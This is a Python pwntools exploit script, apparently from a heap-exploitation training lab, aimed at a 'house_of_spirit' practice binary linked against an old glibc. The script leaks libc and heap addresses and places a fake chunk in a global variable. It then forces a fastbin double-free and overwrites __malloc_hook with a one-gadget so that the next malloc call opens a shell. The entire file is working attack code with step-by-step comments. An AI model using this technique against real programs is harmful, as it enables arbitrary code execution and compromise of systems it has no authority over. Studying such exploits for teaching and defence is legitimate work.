#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_spirit', checksec=False)

libc = ELF('../.glibc/glibc_2.30_no-tcache/libc.so.6', checksec=False)

gs = """
b *main


b *main+270
b *main+327

b *main+415

b *main+541
b *main+652
b *main+707

b *main+792
b *main+873



"""

index = 0

def info(mes):
    return log.info(mes)

def handle():
    global puts
    global heap
    io.recvuntil(b'puts() @ ')
    puts = int(io.recvline(), 16)
    io.recvuntil(b'heap @ ')
    heap = int(io.recvline(), 16)
    info('puts @ ' + hex(puts))
    info("heap @ " + hex(heap))
    return puts, heap
    
def info_user(age, name):
    io.sendafter(b'Enter your age: ', str(age).encode())
    io.sendafter(b'Enter your username: ', name)
    io.recvuntil(b'> ')
    
def malloc(size, data, chunk_name):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', str(size).encode())
    io.sendafter(b'data: ', data)
    io.sendafter(b'chunk name: ', chunk_name)
    io.recvuntil(b'> ')
    index += 1
    return index - 1
    
def free(index):
    io.send(b'2')
    io.sendafter(b'index: ', str(index).encode())
    io.recvuntil(b'> ')

def target():
    io.send(b'3')
    io.recvuntil(b'> ')

def quit():
    io.send(b'4')

    
    
def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path)



io = start()

puts, heap = handle()
libc.address = puts - libc.sym['puts']
info("libc base: " + hex(libc.address))
io.timeout = 0.1

#=====================================================================================
# Ignore the "age" field.
age = 0x71
# Ignore the "username" field.
username = p64(0) + p64(0x1234)

info_user(age, username)

# Request two chunks with any size (chunks A & C) and one chunk with size 0x70.
# The most-significant byte of the _IO_wide_data_0 vtable pointer (0x7f) is used later as a size field.
# Overflow pointers to chunk_A & chunk_C with the address of our fake chunk.
# Chunk_B is used to bypass the fastbins double-free mitigation.
chunk_A = malloc(0x18, b"A"*8, b"A"*8 + p64(elf.sym['user'] + 0x10))
chunk_B = malloc(0x68, b"B"*8, b"B"*8)
chunk_C = malloc(0x18, b"C"*8, b"C"*8 + p64(elf.sym['user'] + 0x10))

# Coerce a double-free by freeing chunk_A, then chunk_B, then chunk_C.
# This way the fake chunk is not at the head of the 0x70 fastbin when it is freed for the second time,
# bypassing the fastbins double-free mitigation.
free(chunk_A) # Frees the fake chunk.
free(chunk_B)
free(chunk_C) # Double-frees the fake chunk.

# The next request for a 0x70-sized chunk will be serviced by the fake chunk.
# Request it, then overwrite its fastbin fd, pointing it near the the malloc hook,
# specifically where the 0x7f byte of the _IO_wide_data_0 vtable pointer will form the
# least-significant byte of a size field.
malloc(0x68, p64(libc.sym['__malloc_hook'] - 0x23), b"D"*8)

# Make two more requests for 0x70-sized chunks. The fake chunk, then chunk_B are allocated to
# service these requests.
malloc(0x68, b"E"*8, b"E"*8)
malloc(0x68, b"F"*8, b"F"*8)

# The next request for a 0x70-sized chunk is serviced by the fake chunk near the malloc hook.
# Use it to overwrite the malloc hook with the address of a one-gadget.
malloc(0x68, b"X"*0x13 + p64(libc.address + 0xe1fa1), b"G"*8) # [rsp+0x50] == NULL

# The next call to malloc() will instead call the one-gadget and drop a shell.
# The argument to malloc() is irrelevant, as long as it passes the program's size check.
malloc(1, b"", b"")

# =============================================================================

io.interactive()
